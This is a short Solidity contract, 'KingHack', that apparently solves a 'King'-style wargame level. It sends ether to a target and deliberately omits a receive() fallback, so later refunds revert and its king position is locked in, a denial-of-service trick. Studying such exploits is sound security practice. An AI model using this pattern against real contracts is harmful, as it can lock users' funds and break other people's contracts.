pragma solidity ^0.6.0; 

contract KingHack{

    function becomeKing(address payable _to) public payable {
        (bool sent, ) = _to.call.value(msg.value)("");
        require(sent, "Failed sending value");
    }
    
    //contract has no recieve() fallback.
}